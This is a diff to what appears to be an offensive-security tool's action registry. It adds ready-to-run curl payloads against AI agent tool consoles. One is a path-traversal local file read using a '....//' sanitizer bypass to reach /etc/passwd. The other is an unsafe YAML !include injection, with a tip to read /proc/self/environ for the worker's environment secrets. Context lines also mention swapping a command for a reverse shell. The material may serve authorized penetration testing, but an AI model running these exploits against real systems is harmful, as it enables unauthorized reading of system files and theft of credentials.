@@ -507,6 +507,24 @@ ACTION_REGISTRY: dict[str, Action] = {
              "workflows/render) or an overwritable skill template (Goose skills hub). Swap id for a "
              "reverse shell."),
 
+    # --- AI: agent/tool-console LFI (path traversal + unsafe YAML) ---
+    "probe_tool_lfi_traversal": _a("probe_tool_lfi_traversal",
+        ["curl -sk -X POST $URL/api/v1/tools/read_log -H 'Content-Type: application/json' "
+         "-d '{\"path\":\"/var/log/....//....//....//....//....//etc/passwd\"}'"],
+        outputs="raw",
+        note="Single-pass sanitizer bypass: a non-recursive str.replace('../','') collapses "
+             "'....//' -> '../'. Keep the allowed base prefix (/var/log/) so the prefix check passes."),
+    "craft_yaml_include_lfi": _a("craft_yaml_include_lfi",
+        ["# Unsafe YAML !include tag (absolute paths, no validation) -> arbitrary read as the worker:",
+         "curl -sk -X POST $URL/api/repos -H 'Content-Type: application/json' "
+         "-d '{\"name\":\"poc\",\"files\":{\".aider.conf.yml\":\"prompts:\\n  x: !include /etc/passwd\","
+         "\"README.md\":\"x\"}}'",
+         "curl -sk -X POST $URL/api/repos/poc/build -H 'Content-Type: application/json' -d '{}'  "
+         "# the build response echoes the included file"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Unsafe YAML deserialization: a custom !include tag reads any absolute path. "
+             "Try /proc/self/environ to dump the worker's env secrets."),
+
     # --- AI advanced: OpenAPI surface discovery ---
     "probe_openapi_spec": _a("probe_openapi_spec",
         ["for p in /openapi.json /swagger.json /api-docs /docs /redoc /swagger-ui.html "
